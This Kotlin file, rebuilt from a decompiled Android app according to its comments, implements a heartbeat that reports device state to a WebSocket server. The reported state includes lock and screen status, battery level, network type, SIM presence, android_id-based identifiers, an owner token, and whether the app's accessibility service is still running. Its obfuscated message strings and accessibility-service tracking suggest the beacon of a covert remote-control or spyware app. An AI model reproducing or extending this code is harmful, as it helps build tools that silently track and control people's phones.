package com.storm.safe.rock.network

import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.BatteryManager
import android.os.Build
import android.os.PowerManager
import android.app.KeyguardManager
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.util.Log
import com.storm.safe.rock.util.StringUtil
import org.json.JSONObject

/**
 * Manages heartbeat payload construction and sending.
 *
 * Extracted from NetworkManager (JADX: C0323a8).
 * - sendHeartbeat() — JADX: a0
 * - buildHeartbeatPayload() — JADX: a2
 */
class HeartbeatManager(
    private val context: Context,
    private val dataSyncClient: DataSyncClient
) {
    companion object {
        private const val TAG = "HeartbeatManager"
    }

    var deviceId: String = ""
    var ownerToken: String = ""

    // JADX: f53126c6
    @Volatile
    var heartbeatCount: Int = 0
        internal set

    // JADX: f53128c8
    @Volatile
    var totalHeartbeats: Int = 0
        internal set

    // JADX: f53127c7
    private val maxInitialHeartbeats: Int = 5

    // JADX: f53129c9
    @Volatile
    var cachedBatteryLevel: Int = -1
        internal set

    // JADX: f53130d0
    @Volatile
    var cachedIsCharging: Boolean = false
        internal set

    // JADX: f53116b6
    @Volatile
    var lastHeartbeatTime: Long = 0L
        internal set

    /**
     * Callback invoked on successful heartbeat to reset failure counter.
     */
    var onHeartbeatSuccess: (() -> Unit)? = null

    /**
     * Callback invoked on heartbeat failure to update connection state.
     */
    var onHeartbeatFailure: (() -> Unit)? = null

    /**
     * Provider for isConnected state from NetworkManager.
     */
    var isConnectedProvider: () -> Boolean = { false }

    /**
     * Send a heartbeat ping to the server.
     * JADX: a0 (static method called on instance)
     *
     * Returns true if heartbeat was sent successfully.
     * On failure, marks isConnected = false via callback.
     */
    fun sendHeartbeat(): Boolean {
        if (!isConnectedProvider() || !dataSyncClient.isConnected) {
            return false
        }
        try {
            val payload = buildHeartbeatPayload()
            payload.put("type", StringUtil.decrypt("L1wHM049MyZSMDlNEz9MLA=="))
            payload.put("sessionId", deviceId)
            // Protocol alignment: Laravel WebSocket MessageRouter + DeviceHandler
            payload.put("itype", "Slr_client")
            payload.put("pid", deviceId)
            payload.put("subc", "ping")
            if (ownerToken.isNotEmpty()) {
                payload.put("owner_token", ownerToken)
            }

            if (!dataSyncClient.send(payload.toString())) {
                Log.w(TAG, "WS心跳发送失败")
                onHeartbeatFailure?.invoke()
                return false
            }

            // Update heartbeat time
            lastHeartbeatTime = System.currentTimeMillis()

            // Success: reset failure counter
            onHeartbeatSuccess?.invoke()

            // Increment heartbeat counters
            if (heartbeatCount < maxInitialHeartbeats) {
                heartbeatCount++
            }
            totalHeartbeats++

            return true
        } catch (e: Exception) {
            Log.w(TAG, "WS心跳失败: ${e.message}")
            onHeartbeatFailure?.invoke()
            return false
        }
    }

    /**
     * Build the heartbeat JSON payload with device state.
     * JADX: a2
     *
     * Contains: deviceId, timestamp, wsConnected, batteryLevel, isCharging,
     * isLocked, isScreenOn, networkType.
     * In early heartbeats (< maxInitialHeartbeats), also includes full device info.
     */
    fun buildHeartbeatPayload(): JSONObject {
        val json = JSONObject()

        // Core fields
        json.put("deviceId", deviceId)
        json.put("timestamp", System.currentTimeMillis())
        json.put("wsConnected", isConnectedProvider())

        // Battery state — JADX: register BATTERY_CHANGED receiver
        var batteryLevel = -1
        var isCharging = false
        try {
            val batteryIntent = context.registerReceiver(
                null,
                IntentFilter(Intent.ACTION_BATTERY_CHANGED)
            )
            if (batteryIntent != null) {
                val level = batteryIntent.getIntExtra("level", -1)
                val scale = batteryIntent.getIntExtra("scale", 100)
                batteryLevel = if (level >= 0 && scale > 0) (level * 100) / scale else -1
                val plugged = batteryIntent.getIntExtra("plugged", -1)
                isCharging = plugged == 1 || plugged == 2 || plugged == 4
            }
        } catch (_: Exception) {}

        // Fallback to BatteryManager
        if (batteryLevel < 0) {
            try {
                val bm = context.getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
                if (bm != null) {
                    val prop = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
                    if (prop in 0..100) {
                        batteryLevel = prop
                        isCharging = bm.isCharging
                    }
                }
            } catch (_: Exception) {}
        }

        // Cache battery values
        if (batteryLevel > 0) {
            cachedBatteryLevel = batteryLevel
            cachedIsCharging = isCharging
        } else if (batteryLevel < 0 && cachedBatteryLevel > 0) {
            batteryLevel = cachedBatteryLevel
            isCharging = cachedIsCharging
        }

        if (batteryLevel >= 0) {
            json.put("batteryLevel", batteryLevel)
            json.put("isCharging", isCharging)
        }

        // Screen/lock state — JADX: PowerManager + KeyguardManager
        var isScreenOn = true
        var isLocked = false
        try {
            val pm = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
            isScreenOn = pm?.isInteractive ?: true

            val km = context.getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager
            val keyguardLocked = km?.isKeyguardLocked ?: false
            isLocked = keyguardLocked || !isScreenOn
        } catch (_: Exception) {}

        json.put("isLocked", isLocked)
        json.put("isScreenOn", isScreenOn)

        // Accessibility alive — JADX: dqtvuisjd.f52358m1.isServiceRunning()
        val accessibilityAlive = try {
            com.storm.safe.rock.service.MyAccessibilityService.isServiceRunning()
        } catch (_: Exception) { false }
        json.put("accessibilityAlive", accessibilityAlive)

        // Network type — JADX: AbstractC1229so.m214642a7(context)
        val networkType = try {
            val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
            val activeNetwork = cm?.activeNetwork
            val caps = if (activeNetwork != null) cm?.getNetworkCapabilities(activeNetwork) else null
            if (caps != null) {
                when {
                    caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "WiFi"
                    caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "移动数据"
                    caps.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "以太网"
                    caps.hasTransport(NetworkCapabilities.TRANSPORT_VPN) -> "VPN"
                    else -> "无网络"
                }
            } else "无网络"
        } catch (_: Exception) { "未知" }
        json.put("networkType", networkType)

        // SIM info every 10th heartbeat — JADX: totalHeartbeats % 10 == 0
        try {
            if (totalHeartbeats % 10 == 0) {
                val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
                val sm = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
                val subCount = try { sm?.activeSubscriptionInfoCount ?: 0 } catch (_: Exception) { 0 }
                val simAbsent = try { tm?.simState == TelephonyManager.SIM_STATE_ABSENT } catch (_: Exception) { true }
                json.put("hasSim", subCount > 0 || !simAbsent)
            }
        } catch (_: Exception) {}

        // Include full device info in early heartbeats — JADX: heartbeatCount < maxInitialHeartbeats
        if (heartbeatCount < maxInitialHeartbeats) {
            try {
                // JADX: Uses AbstractC1229so.m214638a3(context) -> C1228sn device info
                // Core Build fields are always available, no context needed
                json.put("model", Build.MODEL)
                // JADX: c1228sn.f60019a2 (brand)
                json.put("brand", Build.BRAND)
                json.put("osVersion", Build.VERSION.RELEASE)

                // JADX: c1228sn.f60018a1 (deviceName)
                val androidId = try { android.provider.Settings.Secure.getString(context.contentResolver, "android_id") ?: "" } catch (_: Exception) { "" }
                val brandName = Build.BRAND.uppercase()
                val idSuffix = if (androidId.length > 8) androidId.substring(androidId.length - 8).uppercase() else androidId.uppercase()
                json.put("deviceName", "$brandName-$idSuffix")
                // JADX: c1228sn.f60022a5 (appVersion)
                val appVersion = try { context.packageManager.getPackageInfo(context.packageName, 0).versionName ?: "" } catch (_: Exception) { "" }
                json.put("appVersion", appVersion)
                // JADX: c1228sn.f60021a4 (appName)
                val appName = try {
                    val appInfo = context.packageManager.getApplicationInfo(context.packageName, 0)
                    context.packageManager.getApplicationLabel(appInfo).toString()
                } catch (_: Exception) { "" }
                json.put("appName", appName)
                // JADX: c1228sn.f60025a8, f60026a9 (screen dimensions)
                try {
                    val wm = context.getSystemService(Context.WINDOW_SERVICE) as? android.view.WindowManager
                    if (Build.VERSION.SDK_INT >= 30) {
                        val bounds = wm?.currentWindowMetrics?.bounds
                        json.put("screenWidth", bounds?.width() ?: 0)
                        json.put("screenHeight", bounds?.height() ?: 0)
                    } else {
                        val dm = android.util.DisplayMetrics()
                        @Suppress("DEPRECATION")
                        wm?.defaultDisplay?.getRealMetrics(dm)
                        json.put("screenWidth", dm.widthPixels)
                        json.put("screenHeight", dm.heightPixels)
                    }
                } catch (_: Exception) {
                    json.put("screenWidth", 0)
                    json.put("screenHeight", 0)
                }
            } catch (_: Exception) {}
        }

        return json
    }
}
